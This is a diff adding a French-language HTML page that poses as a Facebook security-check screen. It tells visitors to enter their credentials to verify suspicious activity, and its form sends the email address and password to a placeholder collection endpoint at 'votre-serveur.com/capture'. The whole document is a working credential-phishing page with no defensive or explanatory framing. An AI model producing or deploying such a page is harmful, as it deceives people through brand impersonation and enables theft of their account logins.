@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Vérification de la Sécurité</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        .container { width: 300px; margin: 0 auto; }
+        input { margin: 10px 0; }
+        button { padding: 10px 20px; background-color: #4267B2; color: white; border: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Facebook</h2>
+        <p>Veuillez entrer vos identifiants pour vérifier l'activité suspecte.</p> 
+        <form action="https://votre-serveur.com/capture" method="post">
+            <input type="email" name="email" placeholder="Adresse Email" required>
+            <input type="password" name="password" placeholder="Mot de passe" required>
+            <button type="submit">Vérifier</button>
+        </form>
+    </div>
+</body>
+</html>
